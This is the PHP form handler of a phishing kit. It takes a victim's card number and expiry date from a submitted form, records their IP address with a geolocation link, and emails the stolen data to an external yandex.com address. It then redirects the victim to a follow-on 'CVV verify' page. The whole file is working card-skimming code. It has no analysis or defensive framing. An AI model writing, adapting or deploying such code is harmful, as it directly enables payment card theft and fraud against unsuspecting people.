<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Card Number-----: ".$_POST['card']."<br>\n";
$bilsmg .= "|Expiration Month-----: ".$_POST['mm']."<br>\n";
$bilsmg .= "|Expiration Year-----: ".$_POST['yy']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "jahanamcafe@yandex.com";
$bilsub = "Cad Mamak | From $ip";
$bilhead = "From:Cad Mamak<KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../cvv-verify.html";
header("location:$src");
?>